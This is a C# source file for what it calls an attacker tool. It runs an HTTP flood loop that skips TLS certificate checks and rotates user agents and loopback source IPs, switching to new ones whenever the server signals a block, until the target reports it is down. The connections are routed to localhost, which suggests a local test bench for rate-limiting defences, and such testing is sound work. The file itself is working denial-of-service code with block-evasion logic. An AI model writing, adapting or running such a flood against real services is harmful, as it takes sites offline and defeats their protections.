using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace AttackerTool
{
    public static class HttpDDoSLoopbackIp
    {
        public static async Task Start(string targetUrl, ushort port, int limit)
        {
            Console.WriteLine($"The attack tool is starting attack to {targetUrl}:{port}");

            int count = 0;
            int userAgentId = 0;
            int loopbackId = 0;

            while (count < limit)
            {
                try
                {
                    count++;

                    // select user agent
                    var userAgent = Settings.UserAgents[userAgentId];
                    userAgentId = (userAgentId + 1) % Settings.UserAgents.Length;

                    // get loopback IP address from the settings
                    var loopbackIp = Settings.LoopbackIPs[loopbackId];
                    loopbackId = (loopbackId + 1) % Settings.LoopbackIPs.Count;

                    var messageHandler = new SocketsHttpHandler
                    {
                        SslOptions = new System.Net.Security.SslClientAuthenticationOptions
                        {
                            RemoteCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true
                        },
                        ConnectCallback = async (context, cancellationToken) =>
                        {
                            var socket = new Socket(SocketType.Stream, ProtocolType.Tcp);
                            var endpoint = new DnsEndPoint("localhost", port);
                            socket.Bind(new IPEndPoint(IPAddress.Parse(loopbackIp), 0));
                            await socket.ConnectAsync(endpoint);

                            return new NetworkStream(socket, ownsSocket: true);
                        }
                    };

                    // create http client with the custom message handler
                    using var client = new HttpClient(messageHandler);

                    // create http request message
                    var request = new HttpRequestMessage(HttpMethod.Get, targetUrl);

                    // add user agent header
                    request.Headers.UserAgent.ParseAdd(userAgent);

                    // measure the request time
                    Stopwatch stopwatch = Stopwatch.StartNew();

                    // send the request
                    HttpResponseMessage response = await client.SendAsync(request);
                    stopwatch.Stop();

                    // log the response
                    Console.WriteLine($"Attack {count}, Time: {stopwatch.ElapsedMilliseconds}ms, Response: {response.StatusCode}");

                    // handle blocked status codes
                    if (Settings.BlockedStatusCode.Contains(response.StatusCode))
                    {
                        userAgentId = (userAgentId + 1) % Settings.UserAgents.Length;
                        loopbackId = (loopbackId + 1) % Settings.LoopbackIPs.Count;
                    }

                    // check if the server is down
                    if (Settings.ServerDownCode.Contains(response.StatusCode))
                    {
                        Console.WriteLine("Server is down. The mission is completed.");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Exception: {ex.Message}");
                }
            }
        }
    }
}